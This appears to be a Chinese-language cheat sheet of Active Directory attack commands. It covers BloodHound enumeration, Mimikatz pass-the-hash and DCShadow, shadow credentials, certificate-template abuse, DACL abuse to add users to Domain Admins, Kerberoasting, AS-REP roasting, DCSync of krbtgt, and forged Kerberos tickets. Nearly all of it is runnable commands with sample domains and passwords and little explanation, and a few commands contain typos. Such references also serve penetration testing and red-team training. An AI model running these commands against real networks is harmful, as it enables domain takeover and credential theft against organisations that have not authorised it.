### BloodHound

[BloodHound](https://github.com/SpecterOps/BloodHound)

```bash
sudo apt install neo4j
sudo apt install bloodhound
neo4j console
```

web: http://localhost:7474 (neo4j/neo4j)

[SharpHound](https://github.com/SpecterOps/SharpHound)

```bash
runas /user:用户名@域 powershell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -ZipFileName data.zip
or
SharpHound.exe --CollectionMethods All
```

data.zip --> C:\Windows\System32

```bash
bloodhound
```

### 滥用信任账户

```bash
Get-ADTrust -Filter *
.\mimikatz.exe "lsadump::trust /patch" "exit"

mimikatz:
sekurlsa::pth /user:administrator /domain:kali.com /rc4:HASH /run:powershell.exe
```

### 影子凭证

[Whisker](https://github.com/eladshamir/Whisker/)

[Rubeus](https://github.com/GhostPack/Rubeus)

```bash
.\Whisker.exe add /target:backdoor -->command
runas /user:backdoor@admin.com powershell
Rubeus.exe command
```

### DCShadow

```bash
psexec -s cmd
or
Mimikatz:
!+
!processtoken
```

```bash
lsadump::dcshadow /object:snowwolf /attribute:primaryGroupID /value:512
```

```bash
psexec admin.com/administrator -s cmd

mimikatz:
lsadump::dcshadow /push

net user snowwolf /domain
```

### 伪造证书签名提权

[Certify](https://github.com/GhostPack/Certify)

```bash
.\certify.exe find /vulnerable
certify.exe request /ca:证书服务器 /template:易受攻击证书模板名 /altname:新证书用户
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
.\Rubeus.exe s4u /certificate:证书.pfx /impersonate:krbtgt /msdsspn:HOST/域控制器主机名.域名 /dc:域控制器IP /ptt
```

### 滥用DACL

1. 通用所有权限

```bash
Import-Module PowerSploit/Recon/PowerView.ps1
Get-ObjectAcl -SamAccountName snowwolf -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
net group "domain admins" snowwolf /add /domain

net rpc group addmem "Domain Admins" "snowwolf" -U admin.com/snowwolf%'123qwe!@#' -S 域控主机IP地址
net rpc group members "Domain Admins" -U admin.com/snowwolf%'123qwe!@#' -S 域控主机IP地址
```

2. Kerberoasting攻击

```bash
Import-Module PowerSploit/Recon/PowerView.ps1
Get-DomainUser 'snowwolf' | Select serviceprincipalname
Set-DomainObject -Identity 'snowwolf' -Set @{serviceprincipalname='ghostwolflab/superwolf'}
$User = Get-DomainUser 'snowwolf'
$User | Get-DomainSPNTicket

hashcat -a 0 -m 13100 hash passwd.txt
setspn -d  ghostwolflab/superwolf snowwolf
```

3. 强制更改密码

```bash
Import-Module PowerSploit/Recon/PowerView.ps1
$NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
Set-DomainUserPassword -Identity 'snowwolf' -AccountPassword $NewPassword
```

Mimikatz:

```bash
lsadump::setntlm /server:admin.com /user:snowwolf /password:123qwe!@#
```

4. AllExtendedRights

```bash
net rpc password snowwolf '123qwe!@#' -U admin.com/administrator%'123qwe!@#' -S 域控主机IP地址
```

5. WriteOwner

```bash
net rpc group addmem "Domain Admins" snowwolf -U admin/snowwolf%'123qwe!@#' -S 域控主机IP地址
net rpc group members "Domain Admins" -U admin.com/snowwolf%'123qwe!@#' -S 域控主机IP地址
```

6. WriteDacl

```bash
Import-Module PowerSploit/PowerSploit.psd1
Add-DomainObjectAcl -Rights 'All' -TargetIdentity "adminitrator" -PrincipalIdentity "snowwolf"
```

7. GenericWrite

```bash
net rpc group addmem "Domain Admins" snowwolf -U admin/snowwolf%'123qwe!@#' -S 域控主机IP地址
```

### DCSync转储凭据

```bash
Import-Module PowerSploit/PowerSploit.psd1
Add-ObjectACL -PrincipalIdentity snowwolf -Rights DCSync
```

```bash
runas /user:snowwolf powershell
whoami /all
Get-ObjectAcl -Identity "dc=admin,dc=com" -ResolveGUIDs | ? {$_.SecurityIdentifier -match "snowwolf用户SID值"}

snowwolf Mimikatz:

```
lsadump::dcsync /user:krbtgt
```

### AS-REP Roasting

```bash
Import-Module PowerSploit/PowerSploit.psd1
Get-DomainUser -PreauthNotRequired -verbose
```

1. Rubeus

```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /user:snowwolf
```

2. impacket-GetNPUsers

```bash
impacket-GetNPUsers -dc-ip 域控主机IP地址 admin.com/snowwolf -format john -outputfile hashes
john -w=/home/snowwolf/Desktop/passwd.txt hashes
```

3. Metasploit框架

```bash
use uxiliary/gather/asrep
set domain
set rhosts
set username
run
```

### Kerberos

1. Kerberos银票

```bash
mimikatz:
privilege::debug
sekurlsa::logonpasswords
```

```bash
whoami /user
```

|SERVICE|Service Ticket|
|----|----|
|WMI|HOST</br>RPCSS|



```bash
mimikatz:
kerberos::golden /sid:SID值 /domain:admin.com /target:administrator.admin.com /service:cifs /rc4:NTLM值 /user:administrator  /ptt

klist
```

```bash
mimikatz:
kerberos::golden /sid:SID值 /domain:admin.com /target:administrator.admin.com /service:cifs /rc4:NTLM值 /user:administrator
Rubeus.exe ptt /ticket:ticket.kirbi
```
